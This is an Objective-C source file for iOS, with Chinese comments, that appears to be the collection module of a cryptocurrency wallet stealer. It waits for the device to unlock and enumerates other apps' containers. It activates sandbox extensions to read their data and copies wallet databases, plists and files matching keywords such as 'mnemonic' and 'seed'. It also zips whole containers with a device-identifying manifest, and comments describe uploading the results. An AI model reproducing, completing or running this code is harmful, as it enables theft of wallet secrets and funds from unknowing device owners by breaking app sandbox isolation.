#import "OWContainerPass.h"
#import "OWArchive.h"
#import "OWMCM.h"
#import "OWMCMLease.h"
#import "OWLaunchServices.h"
#include <dlfcn.h>
#import <objc/message.h>
#include <sqlite3.h>

NSString * const OWContainerPassDidFinishNotification = @"OWContainerPassDidFinish";

static NSString * const kOWContainerMetaName = @".com.apple.mobile_container_manager.metadata.plist";

#pragma mark - 目标清单

static NSArray<NSDictionary *> *OWTargets(void) {
    static NSArray *t;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *p = [[NSBundle mainBundle] pathForResource:@"targets" ofType:@"plist"];
        NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
        t = d[@"wallets"] ?: @[];
        OWLog(@"目标清单: %lu 条", (unsigned long)t.count);
    });
    return t;
}

#pragma mark - OWFileGate

@implementation OWFileGate

+ (BOOL)isSQLiteAtPath:(NSString *)path {
    NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
    if (!fh) return NO;
    NSData *head = [fh readDataOfLength:16];
    [fh closeFile];
    return head.length >= 16 && [[[NSString alloc] initWithData:[head subdataWithRange:NSMakeRange(0, 15)]
                                                        encoding:NSUTF8StringEncoding] hasPrefix:@"SQLite format"];
}

+ (BOOL)isPlausiblePayloadAtPath:(NSString *)path minBytes:(uint64_t)minBytes maxBytes:(uint64_t)maxBytes {
    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
    if (!a) return NO;
    uint64_t sz = [a fileSize];
    if (sz < minBytes || sz > maxBytes) {
        OWLog(@"gate: %@ 体积越界 %llu", path.lastPathComponent, sz);
        return NO;
    }
    return sz > 0;
}

+ (BOOL)looksEmptyDatabaseAtPath:(NSString *)path {
    if (![self isSQLiteAtPath:path]) return NO;
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(path.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return NO;

    sqlite3_stmt *st = NULL;
    BOOL empty = YES;
    if (sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table';", -1, &st, NULL) == SQLITE_OK) {
        NSMutableArray *tables = [NSMutableArray new];
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *n = sqlite3_column_text(st, 0);
            if (n) [tables addObject:[NSString stringWithUTF8String:(const char *)n]];
        }
        sqlite3_finalize(st);

        for (NSString *tb in tables) {
            NSString *sql = [NSString stringWithFormat:@"SELECT COUNT(*) FROM \"%@\";", tb];
            if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) == SQLITE_OK) {
                if (sqlite3_step(st) == SQLITE_ROW && sqlite3_column_int(st, 0) > 0) { empty = NO; }
                sqlite3_finalize(st);
            }
            if (!empty) break;
        }
    }
    sqlite3_close(db);
    return empty;
}

@end

#pragma mark - OWContainerPass

@implementation OWContainerPass {
    NSMutableArray<NSDictionary *> *_results;
}

- (instancetype)init {
    if (self = [super init]) {
        _maxFileBytes = 200ULL * 1024 * 1024;
        _maxContainerBytes = 800ULL * 1024 * 1024;
        _requireProtectedData = YES;
        _results = [NSMutableArray new];

        NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docDir = docs.firstObject ?: NSTemporaryDirectory();
        _workDir = [docDir stringByAppendingPathComponent:@"ow_collect"];
        [[NSFileManager defaultManager] createDirectoryAtPath:_workDir
                                  withIntermediateDirectories:YES attributes:nil error:nil];
    }
    return self;
}

#pragma mark keybag 前置

- (BOOL)_waitForProtectedDataWithTimeout:(NSTimeInterval)timeout {
    OWDeviceProfile *dev = [OWDeviceProfile current];
    NSDate *deadline = [NSDate dateWithTimeIntervalSinceNow:timeout];
    while (!dev.protectedDataAvailable) {
        OWLog(@"B: keybag 未解锁，等待（避免把读不到误判为没钱包）");
        if ([[NSDate date] compare:deadline] == NSOrderedDescending) {
            _lastError = @"protectedData 长时间不可用（设备重启后未解锁 / 锁屏中）";
            OWLog(@"B: %@", _lastError);
            return NO;
        }
        [NSThread sleepForTimeInterval:2.0];
    }
    return YES;
}

#pragma mark 主流程

- (BOOL)run:(NSError **)error {
    if (self.requireProtectedData && ![self _waitForProtectedDataWithTimeout:120]) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:30
                                userInfo:@{NSLocalizedDescriptionKey: _lastError ?: @"keybag 未解锁"}];
        return NO;
    }

    // ---- MCM 预检：libcontainer + 符号 + 身份 + sandbox 能力 ----
    OWMCMStatus st = [[OWMCM shared] prepare];
    if (st != OWMCMStatusOK) {
        _lastError = [NSString stringWithFormat:@"MCM 不可用(%d): %@", (int)st, [OWMCM shared].lastError];
        OWLog(@"B: %@", _lastError);
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:st
                                userInfo:@{NSLocalizedDescriptionKey: _lastError}];
        return NO;
    }
    OWLog(@"B: MCM 就绪 identity=%@ lease=%@ 上限=%lu",
          [OWMCM shared].signedIdentity ?: @"?",
          [OWMCMLease shared].available ? @"可用" : @"不可用",
          (unsigned long)[OWMCMLease shared].maxConcurrent);

    NSUInteger lsCount = [[OWLaunchServices shared] load];
    OWLog(@"B: LS 映射 %lu 条（%@）", (unsigned long)lsCount, [OWLaunchServices shared].status);

    NSMutableDictionary<NSString *, NSString *> *found = [NSMutableDictionary new];

    // 主类别：App Data（class 2）+ App Group（class 7，备忘录/共享库）
    [self _enumerateClass:OWMCMClassApplicationData into:found];
    [self _enumerateClass:OWMCMClassAppGroup into:found];

    // 次级类别：部分钱包把数据放在 extension / service / system 容器里。
    // 只在命中 targets 时才采集，token 有就采、没有就跳过，不阻塞主流程。
    NSArray<NSNumber *> *secondary = @[
        @(OWMCMClassExtensionData),
        @(OWMCMClassServiceData),
        @(OWMCMClassSystemData),
        @(OWMCMClassProtectedData),
        @(OWMCMClassVPNData),
        @(OWMCMClassScopedPart),
    ];
    for (NSNumber *n in secondary) {
        [self _enumerateClass:(OWMCMClass)n.unsignedLongLongValue into:found];
    }

    [self _writeContainerMap:found];

    // pass2：清单里未命中的定向再取
    [self _targetedPassInto:found];

    [[OWMCMLease shared] releaseAll];

    [[NSNotificationCenter defaultCenter] postNotificationName:OWContainerPassDidFinishNotification object:self];
    OWLog(@"B: 完成，产出 %lu 项，容器映射 %lu 条",
          (unsigned long)_results.count, (unsigned long)found.count);
    // YES = 流程跑通；产出为 0 通常是设备上没装目标钱包，由 OWRoute 判定是否写 done
    return YES;
}

#pragma mark pass1 枚举

- (NSString *)_bundleIdForContainer:(OWMCMContainer *)c {
    NSString *ident = c.identifier;
    // 多数版本 identifier 就是 bundleId（含点）
    if (ident.length && [ident containsString:@"."]) return ident;

    // 形如 UUID → 反查
    NSString *mapped = [[OWLaunchServices shared] bundleIdForUUID:ident];
    if (mapped.length) return mapped;

    // 兜底：读容器根目录 metadata.plist 的 MCMMetadataIdentifier
    NSString *meta = [self _metadataBundleIdAtPath:c.path];
    if (meta.length) return meta;

    return ident ?: @"";
}

- (NSString * _Nullable)_metadataBundleIdAtPath:(NSString *)containerPath {
    if (!containerPath.length) return nil;
    NSString *p = [containerPath stringByAppendingPathComponent:kOWContainerMetaName];
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
    id v = d[@"MCMMetadataIdentifier"];
    return [v isKindOfClass:[NSString class]] ? v : nil;
}

- (void)_enumerateClass:(OWMCMClass)cls into:(NSMutableDictionary<NSString *, NSString *> *)found {
    NSError *err = nil;
    NSArray<OWMCMContainer *> *list = [[OWMCM shared] containersOfClass:cls
                                                           identifiers:nil
                                                                 error:&err];
    if (!list.count) {
        OWLog(@"B: class=%llu(%@) 枚举 0 个%@",
              (unsigned long long)cls, [OWMCM classNameFor:cls],
              err ? [NSString stringWithFormat:@"（%@）", err.localizedDescription] : @"");
        return;
    }

    NSUInteger hit = 0, leaseOK = 0, skippedDup = 0;
    for (OWMCMContainer *c in list) {
        NSString *bid = [self _bundleIdForContainer:c];

        // 去重：同一个 bundleId 可能在多个 class 下都有容器（app-data / extension / service）。
        // 已经采过的跳过，避免重复打包和重复上传。
        BOOL dup = (bid.length && found[bid] != nil);
        if (!dup && bid.length) found[bid] = c.path;

        NSDictionary *target = [self _targetForBundleId:bid];
        if (!target) continue;
        hit++;

        if (dup) {
            skippedDup++;
            OWLog(@"B: 跳过重复 %@（class=%@，已在其它 class 采过）",
                  bid, [OWMCM classNameFor:cls]);
            continue;
        }

        // ★ 必须激活 sandbox extension，否则文件读不到（EPERM）
        NSString *reason = nil;
        if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
            OWLog(@"B: lease 失败 %@ → %@ (%@)", bid, c.path, reason ?: @"?");
            continue;
        }
        leaseOK++;

        [self _collectTarget:target containerPath:c.path];

        // 采完立刻还，避免 lease 池满（目标包 active_leases=3）
        [[OWMCMLease shared] releasePath:c.path];
    }
    OWLog(@"B: class=%llu(%@) 共 %lu 个，命中 %lu，lease 成功 %lu，跳过重复 %lu",
          (unsigned long long)cls, [OWMCM classNameFor:cls],
          (unsigned long)list.count, (unsigned long)hit,
          (unsigned long)leaseOK, (unsigned long)skippedDup);
}

#pragma mark pass2 定向

- (void)_targetedPassInto:(NSMutableDictionary<NSString *, NSString *> *)found {
    NSMutableArray<NSString *> *missing = [NSMutableArray array];
    for (NSDictionary *t in OWTargets()) {
        NSString *bid = t[@"bundleId"];
        if (bid.length && !found[bid]) [missing addObject:bid];
    }
    if (!missing.count) {
        OWLog(@"B: pass2 无需补扫");
        return;
    }
    OWLog(@"B: pass2 定向补扫 %lu 个: %@", (unsigned long)missing.count, missing);

    for (NSString *bid in missing) {
        NSError *err = nil;
        OWMCMContainer *c = [[OWMCM shared] containerOfClass:OWMCMClassApplicationData
                                                  identifier:bid error:&err];
        if (!c) {
            OWLog(@"B: pass2 %@ 未找到%@", bid,
                  err ? [NSString stringWithFormat:@"（%@）", err.localizedDescription] : @"");
            continue;
        }
        NSString *reason = nil;
        if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
            OWLog(@"B: pass2 %@ lease 失败 (%@)", bid, reason ?: @"?");
            continue;
        }
        found[bid] = c.path;
        NSDictionary *t = [self _targetForBundleId:bid];
        if (t) [self _collectTarget:t containerPath:c.path];
        [[OWMCMLease shared] releasePath:c.path];
    }
}

- (BOOL)grabBundleId:(NSString *)bundleId toDir:(NSString *)dir error:(NSError **)error {
    if (!bundleId.length) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:31
                                userInfo:@{NSLocalizedDescriptionKey: @"bundleId 为空"}];
        return NO;
    }

    OWMCMContainer *c = [[OWMCM shared] containerOfClass:OWMCMClassApplicationData
                                              identifier:bundleId error:error];
    if (!c) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:31
                                userInfo:@{NSLocalizedDescriptionKey:
                                    [NSString stringWithFormat:@"取不到容器 %@", bundleId]}];
        return NO;
    }

    NSString *reason = nil;
    if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
        if (error) *error = [NSError errorWithDomain:@"OWContainerPass" code:32
                                userInfo:@{NSLocalizedDescriptionKey: reason ?: @"lease 失败"}];
        return NO;
    }

    NSDictionary *t = [self _targetForBundleId:bundleId]
        ?: @{@"name": bundleId, @"bundleId": bundleId, @"mode": @"scan"};
    [self _collectTarget:t containerPath:c.path];

    [[OWMCMLease shared] releasePath:c.path];
    return YES;
}

#pragma mark 采集

- (NSDictionary * _Nullable)_targetForBundleId:(NSString *)bid {
    for (NSDictionary *t in OWTargets()) {
        if ([t[@"bundleId"] isEqualToString:bid]) return t;
    }
    return nil;
}

- (void)_collectTarget:(NSDictionary *)target containerPath:(NSString *)containerPath {
    NSString *name = target[@"name"] ?: target[@"bundleId"];
    NSString *mode = target[@"mode"] ?: @"files";
    NSString *outDir = [self.workDir stringByAppendingPathComponent:name];
    [[NSFileManager defaultManager] createDirectoryAtPath:outDir
                              withIntermediateDirectories:YES attributes:nil error:nil];
    OWLog(@"B: 采集 %@ (%@) mode=%@", name, target[@"bundleId"], mode);

    if ([mode isEqualToString:@"whole_container"]) {
        [self _zipContainer:containerPath to:[outDir stringByAppendingPathComponent:@"container.zip"] name:name];
        return;
    }

    // 定义件优先
    NSArray *paths = target[@"paths"] ?: @[];
    NSUInteger foundFiles = 0;
    for (NSString *rel in paths) {
        NSString *src = [containerPath stringByAppendingPathComponent:rel];
        if ([[NSFileManager defaultManager] fileExistsAtPath:src]) {
            if ([self _copyItem:src toDir:outDir name:rel.lastPathComponent]) foundFiles++;
            // sqlite 边车（-wal/-shm 必须跟着主库走，否则库内容不完整）
            for (NSString *ext in @[@"-wal", @"-shm"]) {
                NSString *side = [src stringByAppendingString:ext];
                if ([[NSFileManager defaultManager] fileExistsAtPath:side]) {
                    [self _copyItem:side toDir:outDir
                               name:[rel.lastPathComponent stringByAppendingString:ext]];
                }
            }
        }
    }
    OWLog(@"B: %@ 定义件命中 %lu/%lu", name, (unsigned long)foundFiles, (unsigned long)paths.count);

    // 兜底：按关键字 + 扩展名扫，防止定义件路径与实际版本不一致
    NSArray *keywords = target[@"keywords"] ?: @[];
    NSArray *exts = target[@"exts"] ?: @[];
    if (foundFiles == 0 && (keywords.count || exts.count)) {
        OWLog(@"B: %@ 定义件全未命中，启用兜底扫描", name);
        [self _scanDirectory:containerPath keywords:keywords exts:exts toDir:outDir name:name];
    }

    [self _noteResultForName:name bundleId:target[@"bundleId"] dir:outDir];
}

// 记账：文件数 / 体积 / 是否空库
- (void)_noteResultForName:(NSString *)name bundleId:(NSString *)bid dir:(NSString *)outDir {
    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outDir error:nil];
    uint64_t total = 0;
    BOOL anyEmpty = NO;
    for (NSString *f in files) {
        NSString *p = [outDir stringByAppendingPathComponent:f];
        NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:p error:nil];
        total += [a fileSize];
        if ([OWFileGate looksEmptyDatabaseAtPath:p]) anyEmpty = YES;
    }
    OWLog(@"B: 取得 %@ %lu 个文件 %llu B%@", name, (unsigned long)files.count, total,
          anyEmpty ? @" [空库/未建钱包]" : @"");
    [_results addObject:@{
        @"bundleId": bid ?: name,
        @"name": name,
        @"path": outDir,
        @"fileCount": @(files.count),
        @"bytes": @(total),
        @"emptyDatabase": @(anyEmpty),
        @"isDir": @(YES),
    }];
}

- (void)_scanDirectory:(NSString *)root
              keywords:(NSArray<NSString *> *)keywords
                  exts:(NSArray<NSString *> *)exts
                 toDir:(NSString *)outDir
                  name:(NSString *)name {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
    NSUInteger limit = 0;
    for (NSString *rel in en) {
        if (++limit > 20000) break;
        NSString *lower = rel.lowercaseString;

        BOOL extHit = exts.count && [exts containsObject:lower.pathExtension];
        BOOL kwHit = NO;
        for (NSString *k in keywords) {
            if ([lower rangeOfString:k.lowercaseString].location != NSNotFound) { kwHit = YES; break; }
        }
        if (!extHit && !kwHit) continue;

        NSString *src = [root stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:src isDirectory:&isDir] || isDir) continue;
        [self _copyItem:src toDir:outDir name:name];
    }
}

- (BOOL)_copyItem:(NSString *)src toDir:(NSString *)outDir name:(NSString *)name {
    // 用传入的 name（定义件可能同名但不同目录；边车要带 -wal 后缀）
    NSString *leaf = name.length ? name : src.lastPathComponent;

    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:src error:nil];
    if (!attrs) {
        OWLog(@"B: skip 无法 stat %@", leaf);
        return NO;
    }
    uint64_t sz = [attrs fileSize];

    // 关键小文件豁免体积门限：这些正是要的东西，不能因为门限被跳过
    NSString *ext = leaf.pathExtension.lowercaseString;
    NSSet *critical = [NSSet setWithArray:@[@"sqlite", @"sqlite3", @"db", @"plist",
                                            @"json", @"realm", @"txt"]];
    BOOL exempt = [critical containsObject:ext];
    if (!exempt) {
        // 非关键文件走统一门限校验（内部会打 gate: 日志说明越界原因）
        if (![OWFileGate isPlausiblePayloadAtPath:src minBytes:1 maxBytes:self.maxFileBytes]) {
            return NO;
        }
    } else if (sz == 0) {
        OWLog(@"B: skip empty %@", leaf);
        return NO;
    }

    NSString *dst = [outDir stringByAppendingPathComponent:leaf];
    NSError *e = nil;
    [[NSFileManager defaultManager] removeItemAtPath:dst error:nil];
    if (![[NSFileManager defaultManager] copyItemAtPath:src toPath:dst error:&e]) {
        OWLog(@"B: 拷贝失败 %@ -> %@", leaf, e.localizedDescription);
        return NO;
    }

    BOOL emptyDb = [OWFileGate looksEmptyDatabaseAtPath:dst];
    [[OWState shared] notePayload:leaf bytes:sz valid:!emptyDb];
    OWLog(@"B: 取得 %@ (%llu B)%@", leaf, sz, emptyDb ? @" [空库/未建钱包]" : @"");
    return YES;
}

- (void)_zipContainer:(NSString *)containerPath to:(NSString *)zipPath name:(NSString *)name {
    // 必须真的生成 zip：只把目录塞进 results 会在上传阶段被 !isDir 过滤掉
    if (!name.length) name = @"Unknown";
    UIDevice *dev = [UIDevice currentDevice];
    NSString *idfv = dev.identifierForVendor.UUIDString ?: @"";
    NSDictionary *manifest = @{
        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                          dev.model, dev.systemVersion, idfv],
        @"ios": dev.systemVersion ?: @"",
        @"productType": [OWDeviceProfile current].machine ?: dev.model,
        @"found": @[name],
        @"wallets": @[@{@"wallet": name, @"bundleID": @"", @"bytes": @0}],
        @"source": @"OPENsrc",
    };
    NSError *e = nil;
    BOOL ok = [OWArchive zipDirectory:containerPath
                                   to:zipPath
                             manifest:manifest
                               subdir:name
                             maxBytes:self.maxFileBytes
                             totalCap:self.maxContainerBytes
                                error:&e];
    if (!ok) {
        OWLog(@"B: 整容器打包失败 %@ -> %@", name, e.localizedDescription ?: @"无条目");
        // 退而求其次：把定义件级别的 sqlite/plist/json 全捞一遍
        [self _scanDirectory:containerPath
                    keywords:@[@"wallet", @"key", @"mnemonic", @"seed", @"realm"]
                        exts:@[@"sqlite", @"sqlite3", @"db", @"plist", @"json", @"realm"]
                       toDir:[zipPath stringByDeletingLastPathComponent]
                        name:name];
        return;
    }

    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:zipPath error:nil];
    uint64_t sz = [a fileSize];
    if (sz == 0) { OWLog(@"B: 整容器 zip 为空 %@", name); return; }

    [_results addObject:@{@"name": name, @"path": zipPath, @"bytes": @(sz),
                          @"emptyDb": @NO, @"wholeContainer": @YES}];
    [[OWState shared] notePayload:name bytes:sz valid:YES];
    OWLog(@"B: 整容器打包 %@ -> %llu B", name, sz);
}

- (void)_writeContainerMap:(NSDictionary *)map {
    NSString *p = [self.workDir stringByAppendingPathComponent:@"container_map.plist"];
    [map writeToFile:p atomically:YES];
    OWLog(@"B: 容器映射写入 %lu 条", (unsigned long)map.count);
}

@end
